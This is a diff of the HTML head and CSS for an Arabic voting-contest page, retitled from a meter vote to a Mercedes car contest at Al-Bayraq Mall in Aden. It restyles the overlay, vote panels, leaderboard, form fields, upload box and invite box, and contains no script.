@@ -3,519 +3,616 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>أمير المترات | المعرض العصري والتصويت السحابي المباشر على متر فلينج</title>
+<title>البيرق مول — عدن | مسابقة التصويت الكبرى على سيارة مرسيدس</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-dark: #030712;
-    --surface: #0b1329;
-    --surface-light: #111d3b;
-    --border: #1e294b;
-    --primary: #38bdf8;
-    --primary-glow: rgba(56, 189, 248, 0.4);
-    --gold: #f59e0b;
-    --gold-bright: #fbbf24;
-    --gold-glow: rgba(245, 158, 11, 0.35);
-    --cyan: #06b6d4;
-    --danger: #ef4444;
-    --success: #10b981;
-    --text-white: #f8fafc;
-    --text-muted: #94a3b8;
-    --grad-tech: linear-gradient(135deg, #0284c7 0%, #0369a1 50%, #f59e0b 100%);
-    --grad-gold: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
-    --grad-glass: linear-gradient(145deg, rgba(17, 29, 59, 0.9), rgba(11, 19, 41, 0.95));
+    --bg-obsidian: #050507;
+    --bg-card: #0e1015;
+    --bg-elevated: #161922;
+    --border-royal: rgba(212, 175, 55, 0.28);
+    --gold-royal: #d4af37;
+    --gold-shine: #fce588;
+    --emerald-luxury: #059669;
+    --emerald-glow: rgba(16, 185, 129, 0.35);
+    --crimson-alert: #e11d48;
+    --text-main: #f9fafb;
+    --text-sub: #9ca3af;
+    --grad-royal: linear-gradient(135deg, #b8860b 0%, #f5d061 50%, #996515 100%);
+    --grad-emerald: linear-gradient(135deg, #047857 0%, #10b981 100%);
+    --grad-panel: linear-gradient(165deg, rgba(22, 25, 34, 0.96) 0%, rgba(10, 12, 17, 0.98) 100%);
   }
 
   * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
   html { scroll-behavior: smooth; }
 
   body {
-    background-color: var(--bg-dark);
-    background-image: 
-      radial-gradient(circle at 15% 10%, rgba(56, 189, 248, 0.12) 0%, transparent 45%),
-      radial-gradient(circle at 85% 20%, rgba(245, 158, 11, 0.12) 0%, transparent 45%),
-      radial-gradient(circle at 50% 90%, rgba(6, 182, 212, 0.08) 0%, transparent 55%);
-    color: var(--text-white);
+    background-color: var(--bg-obsidian);
+    background-image:
+      radial-gradient(circle at 50% 0%, rgba(212, 175, 55, 0.16) 0%, transparent 50%),
+      radial-gradient(circle at 10% 45%, rgba(16, 185, 129, 0.08) 0%, transparent 45%),
+      radial-gradient(circle at 90% 75%, rgba(212, 175, 55, 0.09) 0%, transparent 45%);
+    color: var(--text-main);
     line-height: 1.8;
     overflow-x: hidden;
   }
 
-  /* ===== نافذة التنبيه الفورية ===== */
-  #promoModal {
+  /* ===== نافذة الترحيب الملكية ===== */
+  #welcomeOverlay {
     position: fixed; inset: 0;
-    background: rgba(3, 7, 18, 0.88);
-    backdrop-filter: blur(14px);
+    background: rgba(5, 5, 7, 0.9);
+    backdrop-filter: blur(16px);
     z-index: 9999;
     display: flex; align-items: center; justify-content: center;
     padding: 20px;
-    animation: fadeInModal 0.3s ease forwards;
+    animation: popIn 0.3s ease forwards;
   }
 
-  @keyframes fadeInModal {
+  @keyframes popIn {
     from { opacity: 0; transform: scale(0.94); }
     to { opacity: 1; transform: scale(1); }
   }
 
-  .modal-box {
-    background: linear-gradient(160deg, #162242 0%, #0b1329 100%);
-    border: 2px solid var(--gold);
-    border-radius: 32px;
-    padding: 35px 25px;
-    max-width: 480px; width: 100%;
+  .welcome-card {
+    background: var(--grad-panel);
+    border: 2px solid var(--gold-royal);
+    border-radius: 34px;
+    padding: 36px 26px;
+    max-width: 500px; width: 100%;
     text-align: center;
-    box-shadow: 0 25px 60px rgba(0,0,0,0.8), 0 0 45px rgba(245,158,11,0.35);
+    box-shadow: 0 30px 80px rgba(0,0,0,0.85), 0 0 50px rgba(212,175,55,0.25);
   }
 
-  .modal-badge {
+  .welcome-tag {
     display: inline-block;
-    background: var(--grad-gold);
-    color: #030712;
-    font-weight: 900; font-size: 14px;
-    padding: 6px 20px; border-radius: 30px;
-    margin-bottom: 16px;
+    background: var(--grad-royal);
+    color: #050507;
+    font-weight: 900; font-size: 13px;
+    padding: 5px 18px; border-radius: 30px;
+    margin-bottom: 14px;
   }
 
-  .modal-box h2 { font-size: 26px; font-weight: 900; color: var(--gold-bright); margin-bottom: 12px; line-height: 1.3; }
-  .modal-box p { color: #cbd5e1; font-size: 15px; margin-bottom: 24px; }
-  .modal-actions { display: flex; flex-direction: column; gap: 10px; }
-
-  .modal-btn {
-    background: var(--grad-tech); color: #fff;
-    font-weight: 900; font-size: 16px;
-    padding: 14px 28px; border-radius: 50px;
-    border: none; cursor: pointer; width: 100%;
-    box-shadow: 0 10px 25px var(--primary-glow);
-    transition: 0.2s;
-  }
-  .modal-btn.secondary {
-    background: rgba(245, 158, 11, 0.15);
-    border: 1.5px solid var(--gold);
-    color: var(--gold-bright);
-    box-shadow: none;
-  }
-  .modal-btn:hover { transform: translateY(-2px); }
-
-  /* ===== الشريط العلوي ===== */
-  .navbar {
-    position: sticky; top: 15px; z-index: 1000;
-    max-width: 1100px; margin: 0 auto; padding: 0 15px;
+  .welcome-card h2 {
+    font-size: 27px; font-weight: 900;
+    background: var(--grad-royal);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    margin-bottom: 12px;
   }
 
-  .nav-box {
-    background: rgba(11, 19, 41, 0.88);
-    backdrop-filter: blur(25px);
-    border: 1px solid rgba(56, 189, 248, 0.3);
-    border-radius: 60px; padding: 12px 28px;
+  .welcome-card p { color: #d1d5db; font-size: 15px; margin-bottom: 24px; }
+  .welcome-btns { display: flex; flex-direction: column; gap: 11px; }
+
+  .w-btn {
+    border: none; border-radius: 999px;
+    padding: 14px 24px; font-size: 16px; font-weight: 900;
+    cursor: pointer; transition: 0.2s;
+  }
+  .w-btn.primary { background: var(--grad-royal); color: #050507; }
+  .w-btn.ghost {
+    background: rgba(16, 185, 129, 0.14);
+    border: 1.5px solid #10b981;
+    color: #6ee7b7;
+  }
+  .w-btn:hover { transform: translateY(-2px); }
+
+  /* ===== شريط التنقل الزجاجي ===== */
+  .top-nav {
+    position: sticky; top: 14px; z-index: 1000;
+    max-width: 1160px; margin: 0 auto; padding: 0 16px;
+  }
+
+  .top-nav-inner {
+    background: rgba(14, 16, 21, 0.86);
+    backdrop-filter: blur(22px);
+    border: 1px solid var(--border-royal);
+    border-radius: 999px;
+    padding: 10px 24px;
     display: flex; align-items: center; justify-content: space-between;
-    box-shadow: 0 20px 45px rgba(0, 0, 0, 0.7);
     flex-wrap: wrap; gap: 12px;
+    box-shadow: 0 18px 40px rgba(0,0,0,0.65);
   }
 
-  .brand-logo {
-    font-size: 23px; font-weight: 900;
-    background: linear-gradient(90deg, #ffffff, var(--cyan));
+  .bayraq-brand {
+    display: flex; align-items: center; gap: 12px;
+    text-decoration: none;
+  }
+
+  .bayraq-logo-svg {
+    width: 44px; height: 44px; flex-shrink: 0;
+  }
+
+  .brand-titles { display: flex; flex-direction: column; line-height: 1.15; }
+  .brand-titles strong { font-size: 19px; font-weight: 900; color: var(--gold-shine); }
+  .brand-titles span { font-size: 11px; font-weight: 700; color: #6ee7b7; letter-spacing: 0.5px; }
+
+  .nav-menu { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+  .nav-menu a {
+    text-decoration: none; color: var(--text-sub);
+    font-size: 13.5px; font-weight: 800;
+    padding: 8px 16px; border-radius: 999px; transition: 0.2s;
+  }
+  .nav-menu a:hover { color: #fff; background: rgba(255,255,255,0.06); }
+  .nav-menu a.nav-vote { background: var(--grad-royal); color: #050507; }
+  .nav-menu a.nav-reg { background: var(--grad-emerald); color: #fff; }
+
+  /* ===== الواجهة الرئيسية وبطاقة سيارة المرسيدس ===== */
+  .hero-section {
+    max-width: 1160px; margin: 36px auto 0; padding: 20px 20px 40px;
+  }
+
+  .hero-banner {
+    background: var(--grad-panel);
+    border: 1.5px solid var(--border-royal);
+    border-radius: 38px;
+    padding: 40px 32px;
+    display: grid; grid-template-columns: 1.15fr 0.85fr;
+    gap: 32px; align-items: center;
+    box-shadow: 0 35px 80px rgba(0,0,0,0.75);
+  }
+
+  .mall-chip {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: rgba(212, 175, 55, 0.14);
+    border: 1px solid var(--gold-royal);
+    color: var(--gold-shine);
+    padding: 6px 18px; border-radius: 999px;
+    font-size: 13.5px; font-weight: 800; margin-bottom: 16px;
+  }
+
+  .hero-banner h1 {
+    font-size: 42px; font-weight: 900; line-height: 1.25; margin-bottom: 14px;
+  }
+  .hero-banner h1 span {
+    background: var(--grad-royal);
     -webkit-background-clip: text; -webkit-text-fill-color: transparent;
   }
 
-  .nav-links { display: flex; gap: 8px; flex-wrap: wrap; }
-  .nav-links a {
-    text-decoration: none; color: var(--text-muted);
-    font-size: 14px; font-weight: 700;
-    padding: 8px 16px; border-radius: 30px; transition: 0.2s;
-  }
-  .nav-links a:hover { color: #fff; background: rgba(255, 255, 255, 0.08); }
-  .nav-links a.cta-pill { background: var(--grad-tech); color: #fff; }
-  .nav-links a.vote-pill { background: var(--grad-gold); color: #030712; font-weight: 900; }
+  .hero-banner p { color: var(--text-sub); font-size: 16.5px; margin-bottom: 24px; }
 
-  /* ===== الهيدر والأقسام ===== */
-  header { max-width: 1100px; margin: 35px auto 0; padding: 40px 20px 50px; text-align: center; }
-  .store-badge {
-    display: inline-flex; align-items: center; gap: 10px;
-    background: rgba(56, 189, 248, 0.12);
-    border: 1px solid rgba(56, 189, 248, 0.4);
-    color: var(--cyan); padding: 8px 25px; border-radius: 50px;
-    font-size: 15px; font-weight: 800; margin-bottom: 20px;
-  }
-  header h1 { font-size: 46px; font-weight: 900; line-height: 1.25; margin-bottom: 15px; }
-  header h1 span { background: var(--grad-gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-  header p.subtitle { color: var(--text-muted); font-size: 17.5px; max-width: 750px; margin: 0 auto 25px; }
-
-  section { max-width: 1100px; margin: 60px auto; padding: 0 20px; }
-  .section-head { text-align: center; margin-bottom: 35px; }
-  .section-head .sub { color: var(--cyan); font-size: 14px; font-weight: 800; display: block; margin-bottom: 6px; letter-spacing: 2px; }
-  .section-head h2 { font-size: 34px; font-weight: 900; color: #fff; }
-
-  /* ===== بوابة التصويت المباشر ===== */
-  .voting-section-box {
-    background: linear-gradient(155deg, #121f3d 0%, #091124 100%);
-    border: 2px solid var(--gold);
-    border-radius: 35px; padding: 40px 32px;
-    box-shadow: 0 30px 70px rgba(245, 158, 11, 0.18);
+  .mercedes-showcase {
+    background: #08090d;
+    border: 2px solid var(--gold-royal);
+    border-radius: 28px;
+    padding: 14px;
+    text-align: center;
+    box-shadow: 0 20px 50px rgba(212, 175, 55, 0.22);
   }
 
-  .live-status-bar {
-    display: flex; justify-content: center; align-items: center; gap: 12px;
-    flex-wrap: wrap; margin-bottom: 25px;
+  .mercedes-img-frame {
+    position: relative;
+    border-radius: 20px;
+    overflow: hidden;
+    background: #11131a;
+    aspect-ratio: 16 / 10;
   }
 
-  .live-pill {
+  .mercedes-img-frame img {
+    width: 100%; height: 100%; object-fit: cover; display: block;
+  }
+
+  .mercedes-caption {
+    margin-top: 12px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 10px; flex-wrap: wrap;
+  }
+  .mercedes-caption strong { color: var(--gold-shine); font-size: 16px; font-weight: 900; }
+  .mercedes-caption span {
+    background: rgba(16, 185, 129, 0.16);
+    border: 1px solid #10b981;
+    color: #6ee7b7;
+    padding: 4px 12px; border-radius: 20px;
+    font-size: 12px; font-weight: 800;
+  }
+
+  /* ===== العناوين والأقسام ===== */
+  section { max-width: 1160px; margin: 64px auto; padding: 0 20px; }
+  .sec-header { text-align: center; margin-bottom: 34px; }
+  .sec-header .tag {
+    display: inline-block; color: #6ee7b7;
+    font-size: 13px; font-weight: 800; letter-spacing: 1.5px; margin-bottom: 6px;
+  }
+  .sec-header h2 { font-size: 34px; font-weight: 900; color: #fff; }
+
+  /* ===== بوابة التصويت والنتائج ===== */
+  .arena-box {
+    background: var(--grad-panel);
+    border: 2px solid var(--gold-royal);
+    border-radius: 36px;
+    padding: 38px 30px;
+    box-shadow: 0 30px 75px rgba(0,0,0,0.75);
+  }
+
+  .status-strip {
+    display: flex; justify-content: center; gap: 12px;
+    flex-wrap: wrap; margin-bottom: 24px;
+  }
+
+  .status-pill {
     display: inline-flex; align-items: center; gap: 8px;
-    background: rgba(16, 185, 129, 0.15);
-    border: 1px solid var(--success);
-    color: #6ee7b7; padding: 7px 18px; border-radius: 50px;
+    background: rgba(16, 185, 129, 0.14);
+    border: 1px solid #10b981;
+    color: #6ee7b7; padding: 7px 18px; border-radius: 999px;
     font-size: 13px; font-weight: 800; transition: transform 0.2s ease;
   }
 
-  .pulse-dot {
-    width: 10px; height: 10px; border-radius: 50%;
-    background: var(--success);
-    animation: pulseDot 1.5s infinite;
+  .live-dot {
+    width: 9px; height: 9px; border-radius: 50%;
+    background: #10b981;
+    animation: pulseEmerald 1.5s infinite;
   }
 
-  @keyframes pulseDot {
+  @keyframes pulseEmerald {
     0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
     70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
     100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
   }
 
-  .vote-grid {
-    display: grid; grid-template-columns: 1fr 1.15fr; gap: 28px; align-items: start;
+  .arena-grid {
+    display: grid; grid-template-columns: 1fr 1.15fr;
+    gap: 28px; align-items: start;
   }
 
-  .vote-card-panel {
-    background: rgba(5, 11, 26, 0.88);
-    border: 1.5px solid var(--border);
-    border-radius: 24px; padding: 26px;
+  .panel-card {
+    background: rgba(7, 8, 12, 0.9);
+    border: 1.5px solid var(--border-royal);
+    border-radius: 26px;
+    padding: 26px;
   }
 
-  .vote-card-panel h3 { color: var(--gold-bright); font-size: 21px; font-weight: 900; margin-bottom: 8px; }
-  .vote-card-panel p.desc { color: var(--text-muted); font-size: 13.5px; margin-bottom: 18px; }
+  .panel-card h3 { color: var(--gold-shine); font-size: 21px; font-weight: 900; margin-bottom: 6px; }
+  .panel-card p.sub-desc { color: var(--text-sub); font-size: 13.5px; margin-bottom: 18px; }
 
-  .direct-invite-banner {
+  .invite-alert {
     display: none;
-    background: rgba(56, 189, 248, 0.15);
-    border: 1.5px solid var(--cyan);
-    border-radius: 16px; padding: 14px 18px;
+    background: rgba(16, 185, 129, 0.14);
+    border: 1.5px solid #10b981;
+    border-radius: 16px; padding: 14px;
     margin-bottom: 18px; text-align: center;
   }
-  .direct-invite-banner strong { color: var(--gold-bright); font-size: 16px; }
+  .invite-alert strong { color: var(--gold-shine); font-size: 16px; }
 
-  .captcha-box {
-    background: rgba(17, 29, 59, 0.9);
-    border: 1px dashed var(--cyan);
+  .field { margin-bottom: 14px; }
+  .field label { display: block; font-size: 13.5px; font-weight: 800; color: #e5e7eb; margin-bottom: 6px; }
+
+  .field input, .field select, .field textarea {
+    width: 100%; padding: 13px 16px;
+    border: 1.5px solid #232736; border-radius: 15px;
+    background: #0c0e14; color: #fff; font-size: 14.5px; transition: 0.2s;
+  }
+  .field input:focus, .field select:focus, .field textarea:focus {
+    outline: none; border-color: var(--gold-royal);
+    box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.18);
+  }
+  .field textarea { min-height: 90px; resize: vertical; }
+
+  .pass-wrapper { position: relative; }
+  .pass-toggle {
+    position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
+    background: none; border: none; color: var(--text-sub);
+    font-size: 12.5px; font-weight: 800; cursor: pointer;
+  }
+
+  .anti-fraud-box {
+    background: rgba(225, 29, 72, 0.12);
+    border: 1px solid var(--crimson-alert);
+    border-radius: 15px; padding: 14px 16px; margin-bottom: 16px;
+    display: flex; gap: 10px; align-items: flex-start;
+  }
+  .anti-fraud-box p { color: #fda4af; font-size: 13px; font-weight: 700; line-height: 1.65; }
+
+  .doc-dropzone {
+    background: #0c0e14;
+    border: 2px dashed rgba(212, 175, 55, 0.55);
+    border-radius: 20px; padding: 18px; text-align: center;
+    cursor: pointer; transition: 0.2s; margin-bottom: 14px;
+  }
+  .doc-dropzone:hover { border-color: var(--gold-shine); }
+  .doc-dropzone input[type="file"] { display: none; }
+  .doc-icon { font-size: 30px; display: block; margin-bottom: 4px; }
+  .doc-title { font-weight: 900; font-size: 14.5px; color: var(--gold-shine); }
+  .doc-hint { font-size: 12px; color: var(--text-sub); }
+
+  .doc-preview {
+    display: none; max-width: 130px; max-height: 130px;
+    border-radius: 12px; margin: 12px auto 0;
+    border: 2px solid var(--gold-royal); object-fit: cover;
+  }
+
+  .math-check {
+    background: #12151f;
+    border: 1px dashed #10b981;
     border-radius: 14px; padding: 12px 16px;
     display: flex; align-items: center; justify-content: space-between;
     gap: 12px; margin-bottom: 16px;
   }
-  .captcha-question { font-weight: 900; color: var(--cyan); font-size: 16px; direction: ltr; }
-  .captcha-box input { max-width: 110px; text-align: center; font-weight: 900; padding: 10px !important; }
+  .math-check span { font-weight: 900; color: #6ee7b7; direction: ltr; }
+  .math-check input { max-width: 105px; text-align: center; font-weight: 900; padding: 10px !important; }
 
-  .search-filter-input {
+  .action-btn {
+    width: 100%; margin-top: 10px; padding: 16px;
+    border: none; border-radius: 18px;
+    font-size: 18px; font-weight: 900; cursor: pointer; transition: 0.2s;
+  }
+  .action-btn.gold-action { background: var(--grad-royal); color: #050507; }
+  .action-btn.emerald-action { background: var(--grad-emerald); color: #fff; }
+  .action-btn:hover { transform: translateY(-2px); }
+  .action-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  .feedback-msg {
+    display: none; margin-top: 14px; padding: 14px;
+    border-radius: 14px; text-align: center; font-weight: 800; font-size: 14px;
+  }
+  .feedback-msg.err { display: block; background: rgba(225, 29, 72, 0.18); color: #fda4af; border: 1px solid var(--crimson-alert); }
+  .feedback-msg.ok { display: block; background: rgba(16, 185, 129, 0.18); color: #6ee7b7; border: 1px solid #10b981; }
+
+  .mall-thanks-banner {
+    display: none;
+    margin-top: 16px;
+    background: linear-gradient(145deg, rgba(16, 185, 129, 0.16), rgba(14, 16, 21, 0.96));
+    border: 2px solid #10b981;
+    border-radius: 20px; padding: 20px; text-align: center;
+    animation: popIn 0.3s ease forwards;
+  }
+  .mall-thanks-banner h4 { color: #6ee7b7; font-size: 18.5px; font-weight: 900; margin-bottom: 6px; }
+  .mall-thanks-banner p { color: #e5e7eb; font-size: 14px; }
+  .mall-thanks-badge {
+    display: inline-block; margin-top: 10px;
+    background: var(--grad-royal); color: #050507;
+    font-weight: 900; font-size: 12.5px;
+    padding: 5px 16px; border-radius: 999px;
+  }
+
+  /* ===== قائمة المتصدرين ===== */
+  .filter-box {
     width: 100%; padding: 11px 16px; margin-bottom: 14px;
-    border: 1px solid rgba(56, 189, 248, 0.35);
-    border-radius: 14px; background: #030712; color: #fff; font-size: 13.5px;
+    border: 1px solid var(--border-royal); border-radius: 14px;
+    background: #0c0e14; color: #fff; font-size: 13.5px;
   }
 
-  .leaderboard-list {
+  .rankings-scroll {
     display: flex; flex-direction: column; gap: 11px;
-    max-height: 540px; overflow-y: auto; padding-left: 4px;
+    max-height: 550px; overflow-y: auto; padding-left: 4px;
   }
 
-  .leader-item {
-    background: rgba(17, 29, 59, 0.85);
-    border: 1px solid rgba(56, 189, 248, 0.25);
+  .rank-row {
+    background: #12151f;
+    border: 1px solid rgba(255,255,255,0.07);
     border-radius: 18px; padding: 14px 18px;
     display: flex; align-items: center; justify-content: space-between;
     gap: 12px; transition: 0.2s;
   }
 
-  .leader-item.top-1 {
-    border: 2px solid var(--gold);
-    background: linear-gradient(90deg, rgba(245, 158, 11, 0.18), rgba(17, 29, 59, 0.92));
+  .rank-row.leader-gold {
+    border: 2px solid var(--gold-royal);
+    background: linear-gradient(90deg, rgba(212, 175, 55, 0.16), rgba(18, 21, 31, 0.95));
   }
 
-  .leader-info { display: flex; align-items: center; gap: 12px; }
-  .rank-badge {
+  .rank-left { display: flex; align-items: center; gap: 12px; }
+  .pos-circle {
     width: 38px; height: 38px; border-radius: 50%;
-    background: var(--surface); border: 1px solid var(--cyan);
-    color: var(--cyan); font-weight: 900;
+    background: #08090d; border: 1px solid var(--gold-royal);
+    color: var(--gold-shine); font-weight: 900;
     display: flex; align-items: center; justify-content: center;
     font-size: 15px; flex-shrink: 0;
   }
-  .leader-item.top-1 .rank-badge { background: var(--grad-gold); color: #030712; border: none; }
+  .rank-row.leader-gold .pos-circle { background: var(--grad-royal); color: #050507; border: none; }
 
-  .leader-name { font-weight: 800; font-size: 15.5px; color: #fff; }
-  .leader-meta { font-size: 12px; color: var(--text-muted); }
-  .leader-code { color: var(--gold-bright); font-weight: 800; direction: ltr; display: inline-block; }
+  .row-name { font-weight: 800; font-size: 15.5px; color: #fff; }
+  .row-meta { font-size: 12px; color: var(--text-sub); }
+  .row-code { color: var(--gold-shine); font-weight: 800; direction: ltr; display: inline-block; }
 
-  .vote-count-pill {
-    background: rgba(56, 189, 248, 0.15);
-    border: 1px solid var(--cyan);
-    color: var(--cyan); padding: 5px 14px; border-radius: 30px;
-    font-weight: 900; font-size: 14px; white-space: nowrap;
+  .votes-badge {
+    background: rgba(16, 185, 129, 0.14);
+    border: 1px solid #10b981;
+    color: #6ee7b7; padding: 5px 14px; border-radius: 999px;
+    font-weight: 900; font-size: 13.5px; white-space: nowrap;
   }
 
-  .quick-vote-btn {
-    background: var(--grad-gold); color: #030712;
+  .vote-now-mini {
+    background: var(--grad-royal); color: #050507;
     border: none; padding: 6px 14px; border-radius: 12px;
-    font-weight: 900; font-size: 12px; cursor: pointer;
-    margin-top: 5px; transition: 0.2s;
+    font-weight: 900; font-size: 12px; cursor: pointer; margin-top: 5px;
   }
-  .quick-vote-btn:hover { transform: scale(1.05); }
 
-  .admin-only-control {
-    display: none;
-  }
-  body.admin-mode .admin-only-control {
-    display: inline-block;
-  }
-  .admin-del-btn {
-    background: rgba(239, 68, 68, 0.2);
-    border: 1px solid var(--danger);
-    color: #fca5a5; padding: 4px 10px; border-radius: 8px;
+  .admin-only-control { display: none; }
+  body.admin-mode .admin-only-control { display: inline-block; }
+  .admin-kick-btn {
+    background: rgba(225, 29, 72, 0.2);
+    border: 1px solid var(--crimson-alert);
+    color: #fda4af; padding: 4px 10px; border-radius: 8px;
     font-size: 11px; font-weight: 800; cursor: pointer; margin-top: 5px;
   }
 
-  .store-thanks-card {
-    display: none;
-    margin-top: 18px;
-    background: linear-gradient(145deg, rgba(16, 185, 129, 0.16), rgba(11, 19, 41, 0.95));
-    border: 2px solid var(--success);
-    border-radius: 20px;
-    padding: 20px;
-    text-align: center;
-    animation: fadeInModal 0.3s ease forwards;
+  /* ===== نموذج التسجيل والتذكرة ===== */
+  .reg-card {
+    background: var(--grad-panel);
+    border: 1.5px solid var(--border-royal);
+    border-radius: 36px; padding: 40px;
+    box-shadow: 0 30px 70px rgba(0,0,0,0.75);
   }
-  .store-thanks-card h4 {
-    color: #6ee7b7;
-    font-size: 19px;
-    font-weight: 900;
-    margin-bottom: 6px;
-  }
-  .store-thanks-card p {
-    color: #e2e8f0;
-    font-size: 14px;
-    line-height: 1.7;
-  }
-  .store-thanks-brand {
-    display: inline-block;
-    margin-top: 10px;
-    background: var(--grad-gold);
-    color: #030712;
-    font-weight: 900;
-    font-size: 13px;
-    padding: 5px 16px;
+  .reg-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 18px; }
+  .span-all { grid-column: 1 / -1; }
+
+  #successTicket {
+    display: none; text-align: center; padding: 38px 22px;
+    background: #0a0d14;
+    border: 2px dashed var(--gold-royal);
     border-radius: 30px;
   }
-
-  /* ===== نماذج الإدخال ===== */
-  .form-container {
-    background: var(--grad-glass);
-    border: 2px solid rgba(56, 189, 248, 0.4);
-    border-radius: 35px; padding: 42px;
-    box-shadow: 0 30px 65px rgba(0, 0, 0, 0.75);
+  .code-highlight {
+    display: inline-block;
+    background: rgba(212, 175, 55, 0.14);
+    border: 2px solid var(--gold-royal);
+    color: var(--gold-shine);
+    font-size: 32px; font-weight: 900;
+    padding: 12px 34px; border-radius: 20px;
+    margin: 14px 0; letter-spacing: 3px; direction: ltr;
+  }
+  .invite-box {
+    background: #11141e;
+    border: 1px solid var(--border-royal);
+    color: #f3f4f6;
+    padding: 18px; border-radius: 18px;
+    font-size: 14px; line-height: 1.85;
+    text-align: right; white-space: pre-line;
+    margin: 14px auto; max-width: 620px;
+  }
+  .copy-invite-btn {
+    background: var(--grad-royal); color: #050507;
+    border: none; padding: 13px 28px; border-radius: 999px;
+    font-weight: 900; font-size: 15px; cursor: pointer; margin-top: 8px;
   }
 
-  .form-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 18px; }
-  .field.full { grid-column: 1 / -1; }
-  .field { margin-bottom: 14px; }
-  .field label { display: block; font-weight: 700; color: #e2e8f0; margin-bottom: 6px; font-size: 13.5px; }
+  /* ===== أجنحة البيرق مول وموقعه ===== */
+  .wings-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
+  .wing-card {
+    background: var(--grad-panel);
+    border: 1px solid var(--border-royal);
+    border-radius: 26px; padding: 26px 20px; text-align: center; transition: 0.2s;
+  }
+  .wing-card:hover { transform: translateY(-5px); border-color: var(--gold-shine); }
+  .wing-card.vip { border: 2px solid var(--gold-royal); }
+  .wing-emoji { font-size: 44px; display: block; margin-bottom: 10px; }
+  .wing-card h3 { color: var(--gold-shine); font-size: 20px; font-weight: 900; margin-bottom: 8px; }
+  .wing-card p { color: var(--text-sub); font-size: 13.5px; }
 
-  .field input, .field select, .field textarea {
-    width: 100%; padding: 14px 16px;
-    border: 1.5px solid var(--border); border-radius: 15px;
-    font-size: 14.5px; background: #050b1a; color: #fff; transition: 0.2s;
-  }
-  .field input:focus, .field select:focus, .field textarea:focus {
-    outline: none; border-color: var(--cyan);
-    box-shadow: 0 0 0 4px rgba(6, 182, 212, 0.2);
-  }
-  .field textarea { min-height: 90px; resize: vertical; }
-
-  .password-wrap { position: relative; }
-  .toggle-pass {
-    position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
-    background: none; border: none; color: var(--text-muted);
-    cursor: pointer; font-size: 13px; font-weight: 700;
-  }
-
-  .warning-notice {
-    background: rgba(239, 68, 68, 0.12);
-    border: 1px solid var(--danger);
-    border-radius: 14px; padding: 14px 18px; margin-bottom: 15px;
-    display: flex; align-items: flex-start; gap: 12px;
-  }
-  .warning-notice p { color: #fca5a5; font-size: 13px; font-weight: 700; line-height: 1.65; }
-
-  .upload-box {
-    background: rgba(5, 11, 26, 0.9);
-    border: 2px dashed rgba(245, 158, 11, 0.6);
-    border-radius: 20px; padding: 18px; text-align: center;
-    cursor: pointer; transition: 0.2s; margin-bottom: 14px;
-  }
-  .upload-box:hover { border-color: var(--gold); }
-  .upload-box input[type="file"] { display: none; }
-  .upload-label { display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; }
-  .upload-icon { font-size: 32px; }
-  .upload-text { font-weight: 800; font-size: 14.5px; color: var(--gold-bright); }
-  .upload-sub { font-size: 12px; color: var(--text-muted); }
-
-  .preview-img {
-    display: none; max-width: 130px; max-height: 130px;
-    border-radius: 12px; margin: 12px auto 0;
-    border: 2px solid var(--gold); object-fit: cover;
-  }
-
-  .btn-enter {
-    width: 100%; margin-top: 14px; padding: 17px;
-    border: none; border-radius: 18px;
-    background: var(--grad-tech); color: #fff;
-    font-size: 19px; font-weight: 900; cursor: pointer;
-    box-shadow: 0 14px 35px var(--primary-glow); transition: 0.2s;
-  }
-  .btn-enter.gold-btn { background: var(--grad-gold); color: #030712; box-shadow: 0 14px 35px var(--gold-glow); }
-  .btn-enter:hover { transform: translateY(-2px); }
-  .btn-enter:disabled { opacity: 0.6; cursor: not-allowed; }
-
-  .msg {
-    display: none; margin-top: 16px; padding: 15px;
-    border-radius: 15px; text-align: center; font-weight: 700; font-size: 14px;
-  }
-  .err { display: block; background: rgba(239, 35, 60, 0.18); color: #ff8fa3; border: 1px solid #ef233c; }
-  .ok-msg { display: block; background: rgba(16, 185, 129, 0.18); color: #6ee7b7; border: 1px solid var(--success); }
-
-  #ticketBox {
-    display: none; text-align: center; padding: 40px 22px;
-    background: linear-gradient(145deg, #062338 0%, #030d1a 100%);
-    border: 2px dashed var(--cyan); border-radius: 30px;
-  }
-  .ticket-code {
-    display: inline-block; background: rgba(245, 158, 11, 0.15);
-    border: 2px solid var(--gold); color: var(--gold);
-    font-size: 32px; font-weight: 900; padding: 12px 36px;
-    border-radius: 20px; margin: 14px 0; letter-spacing: 3px; direction: ltr;
-  }
-  .share-message-preview {
-    background: rgba(5, 11, 26, 0.95);
-    border: 1px solid rgba(56, 189, 248, 0.45);
-    color: #e2e8f0;
-    padding: 18px;
-    border-radius: 18px;
-    font-size: 14px;
-    line-height: 1.85;
-    text-align: right;
-    white-space: pre-line;
-    margin: 14px auto;
-    max-width: 600px;
-  }
-  .copy-share-btn {
-    background: var(--grad-gold); color: #030712;
-    border: none; padding: 13px 28px; border-radius: 50px;
-    font-weight: 900; font-size: 15.5px; cursor: pointer; margin-top: 8px;
-  }
-
-  .categories-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
-  .cat-card {
-    background: var(--grad-glass); border: 1px solid var(--border);
